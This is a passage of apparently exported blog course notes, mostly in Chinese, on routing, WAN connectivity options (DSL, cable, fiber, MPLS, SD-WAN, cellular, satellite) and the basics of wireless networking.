driver)：充当信号放大器，可增强信号以覆盖更大距离。</li>\n<li>CSU/DSU (channel service unit/data service unit)（信道服务单元 / 数据服务单元）：用于 ISP 与客户之间的专线连接。<br>\n<img data-src=\"https://cdn-fusion.imgcdn.store/i/2024/9a88c192919a6ac9.png\" alt=\"image\"></li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"Routing\" class=\"active\"><a class=\"anchor\"  href=\"#Routing\">#</a>Routing</h1>\n<h2 id=\"Routing Protocols\" class=\"active\"><a class=\"anchor\"  href=\"#Routing Protocols\">#</a>Routing Protocols</h2>\n<ul>\n<li>路由器的功能：</li>\n<li>路由器连接两个或多个网络，并在网络之间传输数据包。</li>\n<li>主要功能包括：\n<ul>\n<li>连接不同类型的网络（如 LAN 和 WAN）。</li>\n<li>解析第 3 层甚至第 4 层的地址信息。</li>\n<li>决定数据从 A 点到 B 点的最佳路径。</li>\n<li>如果首选路径不可用，可以重新路由流量到另一条路径。</li>\n</ul>\n</li>\n<li>路由器的可选功能：\n<ul>\n<li>过滤广播传输。</li>\n<li>阻止特定类型的流量进入网络。</li>\n<li>支持同时的本地和远程连接。</li>\n<li>提供高网络容错能力，通过冗余组件确保稳定。</li>\n<li>监控网络流量并报告统计数据。</li>\n<li>诊断内部或其他连接问题，并发出警报。</li>\n</ul>\n</li>\n<li>路由器类别：\n<ul>\n<li>核心路由器（Core Routers / Interior Routers）：负责在同一自治系统（AS）内的网络之间传输数据。</li>\n<li>边缘路由器（Edge Routers / Border Routers）：连接自治系统与外部网络。</li>\n<li>外部路由器（Exterior Routers）：组织外部自治系统的路由器，用于在不同的自治系统之间传输数据。</li>\n</ul>\n</li>\n</ul>\n<p><img data-src=\"https://cdn-fusion.imgcdn.store/i/2024/67afd23372d34cc4.png\" alt=\"image\"></p>\n<h2 id=\"Routing Tables\" class=\"active\"><a class=\"anchor\"  href=\"#Routing Tables\">#</a>Routing Tables</h2>\n<ul>\n<li>路由表是由路由器维护的一个数据库，用于存储主机和网络的位置信息，以及到达它们的最优路径。路由表在网络中或跨多个网络传输数据包时至关重要。</li>\n<li>目的：路由表帮助路由器确定到达目的主机的 “下一跳” 或下一个路由器，从而确保数据能够高效地在网络中传输。</li>\n<li>内容：\n<ul>\n<li>目的网络 ID：即路由器可以到达的网络的 IP 地址或网络标识符。</li>\n<li>子网掩码：用于指定网络内的 IP 地址范围，帮助路由器识别 IP 地址中的网络部分。</li>\n<li>网关：指定下一跳路由器的 IP 地址，数据将通过这个网关路由器转发到其目的地。</li>\n<li>接口：指明数据应通过哪个特定的路由器接口或端口发送，以便到达目的地。</li>\n<li>路由度量：这些是分配给每条路由的值，当存在多条路径时，路由器通过度量值选择最佳路径。较低的度量值通常表示优先选择的路径。</li>\n</ul>\n</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th>Destination network ID</th>\n<th>Netmask</th>\n<th>Gateway</th>\n<th>Interface</th>\n<th>Routing metrics (tie breaker)</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>LAN A’s IP address</td>\n<td>LAN A’s netmask</td>\n<td>None (This is router A’s own LAN)</td>\n<td>Port that points toward switch A</td>\n<td>1</td>\n</tr>\n<tr>\n<td>LAN B’s IP address</td>\n<td>LAN B’s netmask</td>\n<td>Router B’s IP address</td>\n<td>Port that points toward router B</td>\n<td>4</td>\n</tr>\n<tr>\n<td>LAN C’s IP address</td>\n<td>LAN C’s netmask</td>\n<td>Router C’s IP address</td>\n<td>Port that points toward router C</td>\n<td>5</td>\n</tr>\n<tr>\n<td>LAN D’s IP address</td>\n<td>LAN D’s netmask</td>\n<td>Router B’s IP address</td>\n<td>Port that points toward router B</td>\n<td>10</td>\n</tr>\n<tr>\n<td>LAN D’s IP address</td>\n<td>LAN D’s netmask</td>\n<td>Router C’s IP address</td>\n<td>Port that points toward router C</td>\n<td>5</td>\n</tr>\n<tr>\n<td>IP address on the Internet</td>\n<td>That host’s netmask</td>\n<td>Router B’s IP address</td>\n<td>Port that points toward router B</td>\n<td>23</td>\n</tr>\n<tr>\n<td>0.0.0.0 (wildcard entry for any network)</td>\n<td>0 (wildcard entry for any netmask)</td>\n<td>Router B’s IP address</td>\n<td>Port that points toward router B</td>\n<td>3</td>\n</tr>\n</tbody>\n</table>\n<p><img data-src=\"https://cdn-fusion.imgcdn.store/i/2024/e08c54ff188d16d7.png\" alt=\"image\"></p>\n<h2 id=\"Routing Path Types\" class=\"active\"><a class=\"anchor\"  href=\"#Routing Path Types\">#</a>Routing Path Types</h2>\n<ol>\n<li>路由路径的确定方式有两种：</li>\n</ol>\n<ul>\n<li>静态路由：\n<ul>\n<li>由网络管理员手动配置路由表，以沿特定路径引导消息。</li>\n<li>适用于简单的网络环境，例如小型企业和其 ISP 之间的静态路由连接。</li>\n</ul>\n</li>\n<li>动态路由：\n<ul>\n<li>路由器会自动计算两个网络之间的最佳路径，并将此信息保存在路由表中。</li>\n<li>动态路由可以检测故障或拥堵的路由，并通过不同的路径重新路由消息。</li>\n</ul>\n</li>\n</ul>\n<ol start=\"2\">\n<li>route</li>\n</ol>\n<ul>\n<li>The route utility allows you to view a host’s routing table</li>\n<li>The  <code>route</code>  command can also be used to add or delete static routes</li>\n<li>The following are some variations of the  <code>route</code>  command for different operating systems:\n<ul>\n<li>On a Linux or UNIX system, use the command  <code>route</code></li>\n<li>On a Windows-based system, use the command  <code>route print</code></li>\n<li>On a Cisco IOS, use the command  <code>show ip route</code></li>\n</ul>\n</li>\n</ul>\n<ol start=\"3\">\n<li>Routing Protocols to Determine Best Paths</li>\n</ol>\n<ul>\n<li>路由协议使路由器之间能够相互通信，以便确定最佳路径。路由器会根据以下标准对路由协议的数据的可靠性和优先级进行评估：\n<ul>\n<li>AD（管理距离 administrative distance）：一个数值，用于指示协议的可靠性，数值越低表示优先级越高。</li>\n<li>收敛时间 (Convergence time)：在发生变化或网络中断时识别出最佳路径所需的时间。收敛时间越短，网络适应变化的速度越快。</li>\n<li>开销（Overhead）：支持协议所施加在底层网络上的负担。开销越小，协议对网络资源的占用越少，效率越高。</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"Routing Metrics\" class=\"active\"><a class=\"anchor\"  href=\"#Routing Metrics\">#</a>Routing Metrics</h2>\n路由度量是用于路由器决定到达目的地最佳路径的一些属性，包括：\n<ul>\n<li>跳数 (Hop count)：路径上经过的中间设备数量。</li>\n<li>理论带宽和实际吞吐量 (Theoretical bandwidth and actual throughput)：路径上的带宽能力和实际数据传输速度。</li>\n<li>延迟或潜伏时间 (Delay or latency)：潜在路径上的延迟。</li>\n<li>负载 (Load)：路径上流量或处理负载的压力。</li>\n<li>最大传输单元 (MTU)：在不进行分片的情况下，路径上允许的最大 IP 包大小（以字节为单位）。</li>\n<li>路由成本 (Routing cost)：分配给特定路由的值，通常与开销或优先级有关。</li>\n<li>路径的可靠性 (Reliability)：潜在路径的稳定性和故障率。</li>\n<li>网络拓扑 (Topology)：网络的物理或逻辑结构。</li>\n<li>无线链路质量 (Wireless link quality)：无线网络中信号的强度和干扰情况。</li>\n<li>能耗 (Energy cost)：对于能耗敏感的设备，路径上使用的能量消耗。</li>\n</ul>\n<h2 id=\"Routing Redundancy\" class=\"active\"><a class=\"anchor\"  href=\"#Routing Redundancy\">#</a>Routing Redundancy</h2>\n在大型网络中，应该通过地理位置不同的硬件和网络媒体与多个ISP连接，以确保网络的稳定性和冗余。\n<ul>\n<li>两种冗余技术：\n<ul>\n<li>Active-active 冗余：所有冗余资源始终处于活动状态，工作均匀分布在它们之间。</li>\n<li>Active-passive 冗余：只有一个或少数冗余资源处于活动状态，其余备份设备处于待机状态。</li>\n</ul>\n</li>\n<li>FHRP（首跳冗余协议 First Hop Redundancy Protocol）：可以提供一个 VIP（虚拟 IP）地址作为默认网关，可能指向多个路由器，以实现更高的可用性。</li>\n<li>路由冗余协议：\n<ul>\n<li>VRRP（虚拟路由冗余协议 Virtual Router Redundancy Protocol）：行业标准协议，指定一个主路由器和其他备份路由器。</li>\n<li>HSRP（热备份路由协议 Hot Standby Routing Protocol）：Cisco 专有协议，指定一个主路由器、一个待机路由器和其他备份路由器。</li>\n<li>GLBP（网关负载平衡协议 Gateway Load Balancing Protocol）：根据优先级对网关进行加权，流量在所有网关之间负载平衡。</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"WAN Connectivity\" class=\"active\"><a class=\"anchor\"  href=\"#WAN Connectivity\">#</a>WAN Connectivity</h1>\n<ol>\n<li>广域网（WAN）连接的选项包括以下几种：</li>\n</ol>\n<ul>\n<li>宽带连接：使用共享电缆和带宽，多个客户共享相同的网络资源。\n<ul>\n<li>ISP（互联网服务提供商）尽力提供与广告相符的带宽，但无法保证。</li>\n<li>带宽是不对称的（异步的）asymmetrical (asynchronous) ，下载速度通常比上传速度快。</li>\n</ul>\n</li>\n<li>专用互联网接入 dedicated internet access（DIA）：带宽专门分配给单个客户。\n<ul>\n<li>带宽是对称的（同步的）symmetrical (synchronous) ，即下载和上传速度大致相同。</li>\n<li>对于需要在线备份大量数据的企业，这种对称带宽非常重要。</li>\n</ul>\n</li>\n</ul>\n<ol start=\"2\">\n<li>DSL (Digital Subscriber Line)</li>\n</ol>\n<ul>\n<li>\n<p>DSL（数字用户线路）是一种在公用交换电话网络 public switched telephone network（PSTN）上运行的广域网连接方法。它能够在一条线路上支持多个数据和语音通道。对于长距离传输，DSL 需要中继器。客户与电信局（CO）的距离会影响实际的吞吐量，DSL 使用了先进的数据调制技术，通过幅度或相位调制在更高的频率上传输数据。</p>\n</li>\n<li>\n<p>DSL 类型</p>\n<ul>\n<li>不同种类的 DSL 根据其吞吐率、数据调制技术、容量和距离限制有所不同，xDSL 代表所有 DSL 类型，&quot;x&quot; 可以用具体的 DSL 类型代替。常见的 DSL 类型包括：</li>\n<li>ADSL（asymmetric DSL 非对称 DSL）：下载速度快于上传速度，是最常见的 DSL 类型，适合视频会议和网页浏览。</li>\n<li>VDSL（very high bit rate DSL or variable DSL 超高速率 DSL 或可变 DSL）：比 ADSL 速度更快，也为非对称连接。</li>\n<li>SDSL（对称 DSLsymmetric DSL）：上传和下载速度相同，最高可达 2 Mbps，适合大量数据的上传和下载。<br>\n<img data-src=\"https://cdn-fusion.imgcdn.store/i/2024/79a4e80a0b1c3c25.png\" alt=\"image\"></li>\n</ul>\n</li>\n<li>\n<p>这张图显示了 DSL 的频率分配情况：</p>\n<ul>\n<li>0 - 4 kHz：用于语音通道，这部分频率专门用于传统的电话语音通信。</li>\n<li>4 - 26 kHz：上行 DSL 频段，这部分频率用于从用户端向网络上行传输数据。</li>\n<li>26 - 138 kHz (ADSL)：这是下行 DSL 频段，通常用于 ADSL 的下行数据传输。</li>\n<li>138 - 1104 kHz (ADSL2)：扩展的下行频段，为 ADSL2 提供更高的下行带宽。</li>\n<li>1104 - 2208 kHz (ADSL2+)：进一步扩展的下行频段，为 ADSL2 + 提供最高的下行带宽。</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"Equipments\" class=\"active\"><a class=\"anchor\"  href=\"#Equipments\">#</a>Equipments</h1>\n<h2 id=\"Cable Broadband\" class=\"active\"><a class=\"anchor\"  href=\"#Cable Broadband\">#</a>Cable Broadband</h2>\n<ol>\n<li>Cable Broadband 概述<br>\n定义：Cable Broadband（又称 Cable Internet 或 Cable Modem Access）基于用于传输电视信号的同轴电缆线路。<br>\n标准：由国际合作标准化努力形成了 DOCSIS（Data Over Cable Service Interface Specifications）规范。<br>\n服务特点：\n<ul>\n<li>通常提供非对称速度，例如下载速度可达 70 Mbps，上传速度为 7 Mbps。</li>\n<li>最新的 DOCSIS 4.0 标准支持对称的多千兆速度，最高可达 10 Gbps 下载和 6 Gbps 上传。<br>\nHFC (hybrid fiber coaxial) 网络：使用光纤电缆将电缆公司的分配中心连接到分配集线器，再到靠近用户的光节点。</li>\n</ul>\n</li>\n<li>Cable Broadband 工作原理<br>\n Cable Modem：\n<ul>\n<li>负责信号的调制和解调，以便通过电缆线路进行传输和接收。</li>\n<li>工作于 OSI 模型的物理层和数据链路层。</li>\n<li>可以连接到其他网络设备，如路由器或交换机。</li>\n<li>可以使用带有 SOHO 路由器功能的设备来组合 Cable Modem，从而在整个网络中共享带宽。<br>\n连接特点：提供专用且连续的连接，但是本地线路需由多个用户共享，这引发了安全性和实际吞吐量的关注。<br>\n<img data-src=\"https://cdn-fusion.imgcdn.store/i/2024/594d06dcc0d28d7d.png\" alt=\"image\"></li>\n</ul>\n</li>\n</ol>\n<h2 id=\"Fiber\" class=\"active\"><a class=\"anchor\"  href=\"#Fiber\">#</a>Fiber</h2>\n<ul>\n<li>随着 ISP（互联网服务提供商）在广域网（WAN）连接服务中的发展趋势，越来越多地提供以下光纤连接类型：\n<ul>\n<li>FTTN（Fiber-to-the-Node 或 Fiber-to-the-Neighborhood）：光纤延伸至附近的节点或社区。</li>\n<li>FTTC（Fiber-to-the-Curb）：光纤延伸至街道边缘，距离用户更近。</li>\n<li>FTTB（Fiber-to-the-Building）或 FTTH（Fiber-to-the-Home）：光纤直接延伸到建筑物或家庭用户，提供更直接和高效的连接。</li>\n</ul>\n</li>\n<li>都市光网络\n<ul>\n<li>MONs（Metropolitan Optical Networks）：都市光网络，通过光纤直接将连接带到客户，以满足大城市或都市区高密度用户的需求。<br>\n<img data-src=\"https://cdn-fusion.imgcdn.store/i/2024/1a9a1283e05af231.png\" alt=\"image\"></li>\n</ul>\n</li>\n</ul>\n<h2 id=\"Leased Lines\" class=\"active\"><a class=\"anchor\"  href=\"#Leased Lines\">#</a>Leased Lines</h2>\n<ul>\n<li>租用线路提供了专用带宽的光纤连接，通常为企业和高需求用户提供稳定可靠的网络服务。租用线路的主要优势包括：\n<ul>\n<li>专用带宽：带宽不被其他用户共享，确保了连接的稳定性。</li>\n<li>对称带宽：下载和上传速度相同，适用于需要大量数据传输的应用。</li>\n<li>服务等级协议（SLA）保证：通常伴有 SLA，确保服务质量、正常运行时间和性能。</li>\n</ul>\n</li>\n<li>租用线路的持续月费会根据多个因素有很大差异，包括：\n<ul>\n<li>所需带宽：更高的带宽意味着更高的费用。</li>\n<li>与 ISP 交换机的距离或公司内部不同地点之间的距离：较长的距离可能会增加费用</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"MPLS (Multiprotocol Label Switching) \" class=\"active\"><a class=\"anchor\"  href=\"#MPLS (Multiprotocol Label Switching) \">#</a>MPLS (Multiprotocol Label Switching) </h2>\n<ul>\n<li>MPLS（Multiprotocol Label Switching，多协议标签交换）是一种网络技术，允许多种第 3 层协议在多个面向连接的第 2 层协议上进行传输。它能够处理各种类型的有效负载，因此被广泛应用于 ISP 的网络中，用于在客户站点之间转移流量。</li>\n<li>MPLS 标签包含了信息，指示路由器下一个应该转发消息的位置，有时也包含优先级信息。MPLS 的主要优势包括：\n<ul>\n<li>高可扩展性：适用于需要大规模业务支持的企业网络。</li>\n<li>流量优先级控制：客户可以在广域网（WAN）中对流量进行优先级设置。</li>\n<li>更高的可靠性、可预测性和安全性：通过标签标记流量，使网络传输更加稳定可靠。</li>\n</ul>\n</li>\n<li>这种技术尤其适合需要可靠数据传输的企业客户，例如需要跨地域进行高优先级数据传输的场景。</li>\n</ul>\n<h2 id=\"SD-WAN\" class=\"active\"><a class=\"anchor\"  href=\"#SD-WAN\">#</a>SD-WAN</h2>\nSD-WAN（Software-defined WAN软件定义广域网）通过抽象和集中化的控制方式来管理跨越多种基础设施的网络功能。相比传统的广域网（WAN），SD-WAN 提供了更多的灵活性和成本效益，特别适用于多地点和多分支的企业网络。以下是 SD-WAN 的主要优势：\n<ul>\n<li>传输无关性（Transport Agnostic）\n<ul>\n<li>SD-WAN 能够管理多种类型的网络连接（例如光纤、DSL、电缆等），无需依赖特定的传输介质。</li>\n<li>不管使用哪种类型的连接，SD-WAN 都能对其进行集中控制和管理。</li>\n</ul>\n</li>\n<li>主动 - 主动负载平衡和自动故障切换\n<ul>\n<li>SD-WAN 能够根据设定的流量优先级动态决定如何使用现有的网络连接，从而实现流量的均衡分配。</li>\n<li>当某个连接出现故障时，系统会自动切换至备用连接，确保网络的连续性。</li>\n</ul>\n</li>\n<li>基于意图的管理（Intent-based Management）\n<ul>\n<li>网络管理员可以根据业务需求设置网络管理策略，例如限制特定应用的带宽使用，以保证其他高优先级应用的流畅运行。</li>\n</ul>\n</li>\n<li>零接触配置（Zero-touch Provisioning）\n<ul>\n<li>SD-WAN 支持远程配置，即使在没有技术人员支持的远程地点也能快速部署和设置。</li>\n</ul>\n</li>\n<li>成本降低\n<ul>\n<li>SD-WAN 能够部分替代 MPLS 或租赁线路等传统连接方式，从而减少网络成本，提高网络连接的性价比。</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"Wireless WANs\" class=\"active\"><a class=\"anchor\"  href=\"#Wireless WANs\">#</a>Wireless WANs</h1>\nWireless WANS are specifically designed for high-throughput; long-distance digital data exchange\n<h2 id=\"Cellular\" class=\"active\"><a class=\"anchor\"  href=\"#Cellular\">#</a>Cellular</h2>\n蜂窝网络最初是为模拟电话服务设计的，但如今已能够提供数据和语音通信。蜂窝技术随着时间的推移经历了多个发展阶段，每一代的特性如下：\n<ul>\n<li>1G (first generation)：以模拟信号为主，仅支持语音传输。</li>\n<li>2G (第二代)：采用数字传输，速度最高可达 240 Kbps。</li>\n<li>3G (第三代)：支持数据传输，速率最高可达 384 Kbps，开始采用分组交换技术以提高数据传输效率。</li>\n<li>4G (第四代)：采用全 IP 网络进行数据和语音传输，传输速率范围在 100 Mbps 到 1 Gbps 之间，标志着移动网络进入高速互联网时代。</li>\n<li>5G (第五代)：要求最低速率为 1 Gbps，最高下载速率可达 20 Gbps，上传速率最高为 10 Gbps，为更高的带宽和低延迟应用提供支持，例如物联网和增强现实（AR）。<br>\n<img data-src=\"https://cdn-fusion.imgcdn.store/i/2024/60bfe4248c298ad0.png\" alt=\"image\"></li>\n</ul>\n<h2 id=\"Satellite\" class=\"active\"><a class=\"anchor\"  href=\"#Satellite\">#</a>Satellite</h2>\n如今，卫星广泛用于传输消费者的语音、视频、音乐和数据。卫星通信依赖于卫星轨道和地面站之间的传输过程。\n<ul>\n<li>卫星轨道\n<ul>\n<li>地球同步轨道 (GEO)\n<ul>\n<li>大多数卫星绕地球在地球同步轨道上运行，这意味着卫星的轨道速度与地球自转速度相同。</li>\n<li>地球同步轨道上的卫星保持在地球上同一地点的上方，便于稳定的通信连接。</li>\n</ul>\n</li>\n<li>传输过程\n<ul>\n<li>信息通过地面的发射器发送至卫星，这一过程称为上行链路。</li>\n<li>卫星上的转发器接收并放大信号，再将其传回地面站，这一过程称为下行链路。</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>卫星互联网服务\n<ul>\n<li>一些公司通过 GEO 卫星提供高带宽的互联网接入服务。</li>\n<li>卫星互联网服务通常为不对称连接，带宽在多个用户之间共享。</li>\n<li>传输速率根据服务提供商的控制和调度而有所不同。</li>\n</ul>\n</li>\n<li>卫星互联网因其广覆盖的特性，常用于偏远地区或传统网络难以覆盖的区域。然而，由于距离远、带宽共享的限制，其速率和稳定性在一定程度上会受到影响<br>\n<img data-src=\"https://cdn-fusion.imgcdn.store/i/2024/308a32500f285eb4.png\" alt=\"image\"></li>\n</ul>\n","categories":["课程笔记","Network Systems"],"tags":["network system","WAN"]},{"title":"Wireless Networking","url":"/course/Wireless-Networking/","content":"<h1 id=\"Concepts\" class=\"active\"><a class=\"anchor\"  href=\"#Concepts\">#</a>Concepts</h1>\n<h2 id=\"Characteristics of Wireless Transmissions\" class=\"active\"><a class=\"anchor\"  href=\"#Characteristics of Wireless Transmissions\">#</a>Characteristics of Wireless Transmissions</h2>\n<ul>\n<li>Wireless networks (WLANs) are networks that transmit signals through the air via RF(radio frequency) waves</li>\n<li>Wired and wireless signals share many similarities including the use of the same Layer 3 and higher protocols</li>\n<li>The nature of the atmosphere makes wireless transmission different from wired transmission</li>\n</ul>\n<h2 id=\"The Wireless Spectrum\" class=\"active\"><a class=\"anchor\"  href=\"#The Wireless Spectrum\">#</a>The Wireless Spectrum</h2>\n<ol>\n<li>无线频谱：</li>\n</ol>\n<ul>\n<li>无线频谱是用于数据和语音通信的电磁波频率范围，覆盖 9 kHz 到 300 GHz 的频率范围。</li>\n<li>某些频段使用固定频率，即频段内仅包含一个频率。</li>\n</ul>\n<ol start=\"2\">\n<li>RFID（无线射频识别 Radio Frequency Identification）：</li>\n</ol>\n<ul>\n<li>利用电磁场在小芯片（RFID 标签）中存储数据，通常带有天线，可以接收和发送信号，某些标签还内置电池。<br>\nRFID 常用于库存管理。</li>\n<li>近场通信 near-field communication（NFC）是 RFID 的一种形式，在非常近的距离内无线传输数据，标签通过磁感应从设备获取能量。</li>\n</ul>\n<ol start=\"3\">\n<li>Z-Wave 和 ZigBee：</li>\n</ol>\n<ul>\n<li>Z-Wave 是一种智能家居协议，提供连接管理和数据传输，使用一个集线器从智能设备接收命令并将其传递给网络中的设备。</li>\n<li>ZigBee 是一种低功耗无线技术，设计用于处理小数据量，适用于物联网（IoT）设备，如楼宇自动化、暖通空调（HVAC）控制和自动抄表（AMR）。</li>\n</ul>\n<ol start=\"4\">\n<li>蓝牙和 ANT+：</li>\n</ol>\n<ul>\n<li>蓝牙：通过频率跳变扩频技术减少干扰，通常适用于 10-100 米的范围。</li>\n<li>ANT+：基于 ANT 协议的无线协议，适合心率监测器、GPS 设备等活动监控设备，能同步多个设备的数据。</li>\n</ul>\n<ol start=\"5\">\n<li>红外 infrared（IR）技术：</li>\n</ol>\n<ul>\n<li>红外主要用于传感器数据收集，位于人眼可见光谱下方。</li>\n<li>主动红外传感器：发射红外信号，通过反射检测物体。</li>\n<li>被动红外传感器：测量环境红外波的变化，通常用于检测物体移动或变化</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th>技术</th>\n<th>频段</th>\n<th>授权状态</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>RFID</td>\n<td>低频（LF）、高频（HF）、超高频（UHF）等</td>\n<td>通常为非授权频段，视不同国家的规定</td>\n</tr>\n<tr>\n<td>NFC</td>\n<td>13.56 MHz</td>\n<td>非授权频段，全球通用的 ISM 频段</td>\n</tr>\n<tr>\n<td>Z-Wave</td>\n<td>908 MHz（北美）、868 MHz（欧洲）</td>\n<td>授权频段，需遵守地区频段分配</td>\n</tr>\n<tr>\n<td>ZigBee</td>\n<td>2.4 GHz（全球）、868 MHz（欧洲）、915 MHz（美国）</td>\n<td>大多在 2.4 GHz 的非授权频段下使用，属于 ISM 频段</td>\n</tr>\n<tr>\n<td>蓝牙</td>\n<td>2.4 GHz</td>\n<td>非授权频段，全球通用的 ISM 频段</td>\n</tr>\n<tr>\n<td>ANT+</td>\n<td>2.4 GHz</td>\n<td>非授权频段，使用 ISM 频段</td>\n</tr>\n<tr>\n<td>红外 (IR)</td>\n<td>700 nm 到 1 mm（位于可见光以下）</td>\n<td>非授权频段，通常用于短距离设备</td>\n</tr>\n</tbody>\n</table>\n<p><img data-src=\"https://cdn-fusion.imgcdn.store/i/2024/c452aa1219633e9a.png\" alt=\"image\"></p>\n<h2 id=\"Channel Management\" class=\"active\"><a class=\"anchor\"  href=\"#Channel Management\">#</a>Channel Management</h2>\n<ol>\n<li>通道管理<br>\n无线设备通常采用以下两种技术之一来管理频率通道：</li>\n</ol>\n<ul>\n<li>频率跳变扩频 frequency hopping spread spectrum（FHSS）：\n<ul>\n<li>Bluetooth 使用 FHSS，通过在频率之间跳变来减少干扰。</li>\n</ul>\n</li>\n<li>直接序列扩频 direct sequence spread spectrum（DSSS）：\n<ul>\n<li>Wi-Fi 和 ZigBee 使用 DSSS，通过将信号分散在更宽的频带上来增强信号的抗干扰能力。</li>\n</ul>\n</li>\n</ul>\n<ol start=\"2\">\n<li>天线</li>\n</ol>\n<ul>\n<li>无线信号的传输：\n<ul>\n<li>无线信号源自导体上传递的电流，信号从发射器到达天线，天线将其转换为电磁波。</li>\n<li>接收端的天线接收信号后，接收器将其转换回电流。</li>\n<li>两个天线要使用相同的通道，必须调谐至相同的频率，以确保通信的一致性。</li>\n</ul>\n</li>\n<li>辐射模式 radiation pattern ：\n<ul>\n<li>天线的辐射模式描述了其在三维空间中发送或接收电磁能量的相对强度。</li>\n</ul>\n</li>\n<li>天线类型：\n<ul>\n<li>定向天线（Directional/Unidirectional antenna）：沿单一方向发出无线信号，适用于定向传输。</li>\n<li>全向天线（Omnidirectional antenna）：以相同强度发出和接收信号，适用于全方位覆盖。</li>\n</ul>\n</li>\n<li>天线范围：\n<ul>\n<li>天线的地理覆盖范围称为其射程，射程受天线的设计和周围环境的影响。</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"Signal Propagation\" class=\"active\"><a class=\"anchor\"  href=\"#Signal Propagation\">#</a>Signal Propagation</h2>\n<ol>\n<li>信号传播概述</li>\n</ol>\n<ul>\n<li>传播（Propagation）：传播指的是波从一个点到另一个点的移动方式。</li>\n<li>视距（LOS, Line-of-Sight）：信号直接沿直线从发射器到接收器。然而无线信号通常不沿直线传播。</li>\n<li>当信号遇到障碍物时，可能会：\n<ul>\n<li>穿过物体</li>\n<li>被物体吸收</li>\n</ul>\n</li>\n</ul>\n<ol start=\"2\">\n<li>信号衰减和干扰</li>\n</ol>\n<ul>\n<li>衰减（Attenuation）：\n<ul>\n<li>随着信号远离传输源，信号强度逐渐减弱。</li>\n<li>可以通过增加传输功率或使用信号扩展器（Wireless Range Extender）来增强或延长信号。</li>\n</ul>\n</li>\n<li>褪色（Fading）：\n<ul>\n<li>信号遇到障碍物时，其能量会逐渐减弱，过度褪色会导致连接中断或数据传输缓慢。</li>\n</ul>\n</li>\n<li>干扰（Interference）：\n<ul>\n<li>电磁波可能干扰无线通信，无线信号对噪声更加敏感。</li>\n<li>信噪比 Signal-to-noise ratio（SNR）：表示信号强度与噪声的比例，较高的 SNR 通常意味着更好的通信质量。</li>\n</ul>\n</li>\n</ul>\n<ol start=\"3\">\n<li>反射、折射和其他影响</li>\n</ol>\n<ul>\n<li>折射（Refraction）：当波通过物体时，其方向、速度和波长会改变。</li>\n<li>反射（Reflection）：波遇到障碍物时，可能反射回源头。</li>\n<li>散射（Scattering）：当信号遇到比波长小的物体时，信号会向多个方向散射。</li>\n<li>衍射（Diffraction）：信号遇到障碍物时会被分成次级波，从而改变传播路径。这种多路径传播方式称为多路径信号（Multipath Signals）。</li>\n</ul>\n<h1 id=\"802.11 WLAN Standards\" class=\"active\"><a class=\"anchor\"  href=\"#802.11 WLAN Standards\">#</a>802.11 WLAN Standards</h1>\n<h2 id=\"WLAN Standards\" class=\"active\"><a class=\"anchor\"  href=\"#WLAN Standards\">#</a>WLAN Standards</h2>\n<ol>\n<li>工作层级：</li>\n</ol>\n<ul>\n<li>WLAN 在 OSI 模型的第 1 层（物理层）和第 2 层（数据链路层）上工作。</li>\n</ul>\n<ol start=\"2\">\n<li>协议支持：</li>\n</ol>\n<ul>\n<li>WLAN 支持更高层的 OSI 协议和操作系统，包括 TCP/IP 等网络协议栈。</li>\n</ul>\n<ol start=\"3\">\n<li>Wi-Fi 标准：</li>\n</ol>\n<ul>\n<li>WLAN 最常用的标准通常称为 Wi-Fi（wireless fidelity 无线保真）。</li>\n</ul>\n<ol start=\"4\">\n<li>主要 Wi-Fi 标准：</li>\n</ol>\n<ul>\n<li>包括 802.11b、802.11a、802.11g、802.11n、802.11ac 和 802.11ax。</li>\n<li>从 802.11n 开始，标准在 MAC 子层（数据链路层的低层部分）对帧的使用方式进行了改进，以增强网络效率和吞吐量。</li>\n</ul>\n<ol start=\"5\">\n<li>LLC 子层：</li>\n</ol>\n<ul>\n<li>LLC（逻辑链路控制）子层主要负责多路复用、流量和错误控制以及可靠性，确保数据的有序和可靠传输。</li>\n</ul>\n<h2 id=\"Innovations\" class=\"active\"><a class=\"anchor\"  href=\"#Innovations\">#</a>Innovations</h2>\n随着802.11标准的发展，一些关键创新使得后期标准更快且更可靠：\n<ol>\n<li>通道绑定（Channel Bonding）：\n<ul>\n<li>将两个相邻的 20 MHz 通道绑定成一个 40 MHz 通道，这种方式可使单个通道的带宽提升一倍以上。</li>\n</ul>\n</li>\n<li>MIMO（多输入多输出）：\n<ul>\n<li>多个接入点和客户端设备天线可以同时向一个或多个接收器发送信号。</li>\n<li>MIMO 提升了网络范围和吞吐量，提高了数据传输效率。</li>\n</ul>\n</li>\n<li>MU-MIMO（多用户 MIMO）：\n<ul>\n<li>一种更新的技术，允许多个天线同时为多个客户端服务。</li>\n<li>MU-MIMO 减少了网络拥堵，加速了数据传输，适用于 WAVE 2 802.11ac 产品。</li>\n</ul>\n</li>\n<li>OFDMA（正交频分多址）：\n<ul>\n<li>支持 802.11ax 设备的多用户高效功能，提升了多用户访问的效率。</li>\n</ul>\n</li>\n<li>帧聚合（Frame Aggregation）：\n<ul>\n<li>合并多个帧形成一个较大的帧，从而提高数据传输效率。</li>\n<li>网络可以使用以下两种方法来聚合数据帧：\n<ul>\n<li>A-MSDU（聚合的 MAC 服务数据单元 Aggregated Mac Service Data Unit）</li>\n<li>A-MPDU（聚合的 MAC 协议数据单元 Aggregated Mac Protocol Data Unit）</li>\n</ul>\n</li>\n</ul>\n</li>\n</ol>\n<h2 id=\"Access Method\" class=\"active\"><a class=\"anchor\"  href=\"#Access Method\">#</a>Access Method</h2>\n<ul>\n<li>物理地址标识：\n<ul>\n<li>802.11 MAC 服务在帧中添加 48 位的物理地址，用于识别数据的源和目标。</li>\n<li>采用与以太网相同的物理地址方案，使其能够轻松地与其他 IEEE 网络整合。</li>\n</ul>\n</li>\n<li>CSMA/CA 访问控制：\n<ul>\n<li>无线设备设计上不支持同时传输和接收信号。</li>\n<li>802.11 标准规定使用 CSMA/CA（Carrier Sense Multiple 